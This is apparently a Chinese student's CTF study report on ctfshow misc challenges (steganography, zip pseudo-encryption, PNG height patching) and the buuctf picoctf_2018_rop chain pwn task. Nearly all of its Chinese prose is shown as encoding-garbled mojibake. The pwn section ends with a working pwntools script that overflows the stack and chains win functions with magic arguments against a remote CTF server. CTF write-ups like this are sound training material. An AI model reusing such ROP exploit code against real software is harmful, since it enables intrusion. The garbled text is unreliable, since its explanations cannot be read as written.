# ##ç¿Ÿä¸€é¸£å­¦ä¹ æŠ¥å‘Š03

miscçš„çŸ¥è¯†å¿˜äº†å¥½å¤šï¼Œçˆ²äº†å‡ºé¢˜å»è¡¥äº†ä¸€äº›ï¼Œåšäº†ä¸€äº›é¢˜ç›®ï¼Œpwnå’Œæ±‡ç¼–çš„æœ‰å…³çš„å°±åªæ˜¯çœ‹çœ‹æ•™ç¨‹ï¼Œé¢˜æ²¡æ€ä¹ˆåš

## ctfshow misc40

ï¼ˆåŸºæœ¬ä¸Šè·Ÿç€wpåšçš„ï¼‰

å‹ç¼©åŒ…ä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶æœªåŠ å¯†

![2021020220353747](2021020220353747.png)

txtæ–‡ä»¶å†…å®¹å¦‚ä¸‹

![20210202203611609](20210202203611609.png)

æ„æ€åº”è¯¥å°±æ˜¯å°†è¿™ä¸²äºŒè¿›åˆ¶ä¸€æ­¥ä¸€æ­¥è½¬æ¢çˆ²åè¿›åˆ¶ï¼Œç»“æœå¦‚ä¸‹

![20210202203937153](20210202203937153.png)

å›¾ç‰‡æ”¾åˆ°010æ‰“å¼€å¾—åˆ°

![2021020220520091](2021020220520091.png)

æ˜¯brainfuckï¼Œè§£å¯†å‡ºæ¥æ˜¯ä¸€æ®µæ ¸å¿ƒä»·å€¼è§‚ç¼–ç ï¼Œå†æ¬¡è§£å¯†

![20210202210033865](20210202210033865.png)

mp3ä½¿ç”¨MP3Stegoè§£å¯†

![20210202211028670](20210202211028670.png)

å¾—åˆ°svega.mp3.txtï¼Œæ‰“å¼€å¾—åˆ°hint

![20210202211053755](20210202211053755.png)

å‹ç¼©åŒ…å¯†ç abc123ï¼Œè§£å‹å¾—svega.wav

æ ¹æ®æç¤ºé™é»˜ä¹‹çœ¼ï¼Œå°±æ˜¯ä½¿ç”¨SilentEyeè§£å¯†ï¼ŒSound qualityä¸ºhighï¼Œtypeä¸ºAES128ï¼ŒKeyä¸º202013
ç‚¹decodeå¾—åˆ°flag

![20210202212308583](20210202212308583.png)

## ctfshow misc30

zipcenopå¯ä»¥è§£å¼€zipä¼ªåŠ å¯†ï¼Œæˆ–è€…åœ¨010ä¸­æ”¹

zipcenopä½¿ç”¨å¦‚ä¸‹

```
â”Œâ”€â”€(rootğŸ’€kali)-[~/tools/misc]
â””â”€# java -jar zipcenop.jar r aihe.zip 
```

è§£å‹å¾—aihe.mp3ï¼Œforemoså¯ä»¥åˆ†ç¦»å‡ºä¸€å¼ å›¾ç‰‡

![2021020221393464](2021020221393464.png)

æ˜æ˜¾å®½åº¦ä¸å¯¹ï¼ŒæŸ¥çœ‹å›¾ç‰‡å±æ€§ï¼Œçœ‹åˆ°é«˜åº¦ä¸º371ï¼Œå®½åº¦ä¸º895ï¼Œåˆ†åˆ«å°†å…¶ç”±10è¿›åˆ¶è½¬ä¸º16è¿›åˆ¶ï¼š0173ã€037f

![20210202214237426](20210202214237426.png)

åœ¨010ä¸­å°†é«˜åº¦æ•°å€¼è°ƒé«˜

![2021020221471373](2021020221471373.png)

å¯ä»¥å¾—åˆ°çŒªåœˆå¯†ç ï¼Œè§£å¯†åå³å¯å¾—åˆ°flag

![20210202214810285](20210202214810285.png)

## buuctf picoctf_2018_rop chain

32ä½åŠ¨æ€é“¾æ¥ï¼ŒNXæ‰“å¼€

![image-20220409191303908](image-20220409191303908.png)

mianå‡½æ•°å¦‚ä¸‹

![image-20220409191532291](image-20220409191532291.png)

vulnå‡½æ•°é‡Œæœ‰æ ˆæº¢å‡º

![image-20220409191535331](image-20220409191535331.png)

å°†flagè¯»å…¥åˆ°äº†å‚æ•°sé‡Œé¢ï¼Œæ»¡è¶³æ¡ä»¶`win1&&win2 &&a1==-59039827`çš„æ¡ä»¶ï¼Œå°±èƒ½è¯»å‡ºflag

![image-20220409191539084](image-20220409191539084.png)

å‘ç°win1å·²ç»è¢«èµ‹å€¼1ï¼Œå¯ä»¥ä¸ç”¨ç®¡ï¼Œ

![image-20220409191541190](image-20220409191541190.png)



win2èµ‹å€¼çš„å‡½æ•°å¦‚ä¸‹

å½“æ»¡è¶³win1 && a1 == -1163220307æ—¶ï¼Œwin2å°†è¢«èµ‹å€¼1ï¼Œè¿™é‡Œwin1å·²ç»æ»¡è¶³äº†ï¼Œæ‰€ä»¥åªéœ€è¦ç»™win_function2ä¼ å‚æ—¶ï¼Œå°†å‚æ•°è®¾ç½®æˆ-1163220307å³å¯ã€‚

æ»¡è¶³win1å’Œwin2åå†è¿”å›æ¥çœ‹flagå‡½æ•°ï¼Œæœ€ååªéœ€è¦æ»¡è¶³a1 == -559039827å³å¯è¾“å‡ºflagã€‚

a1æ˜¯ä»flagå‡½æ•°çš„å‚æ•°ä¸­è·å–çš„ï¼Œæ˜¯å¯æ§çš„ã€‚

![image-20220409191543194](image-20220409191543194.png)

ä»£ç¢¼å¦‚ä¸‹

```python
from pwn import *

#start
io = remote("node4.buuoj.cn",26324)
# io = process("../buu/picoctf_2018_rop chain")
elf = ELF("../buu/PicoCTF_2018_rop_chain")


#params
flag_addr = elf.symbols['flag']
win1_addr = elf.symbols['win_function1']
win2_addr = elf.symbols['win_function2']
win2_a = 0x0BAAAAAAD
flag_a = 0x0DEADBAAD

#attack
payload = b'M'*(0x18+4) + p32(win1_addr) + p32(win2_addr) + p32(flag_addr) + p32(win2_a) + p32(flag_a)
io.sendlineafter("input> ",payload)

io.interactive()

```

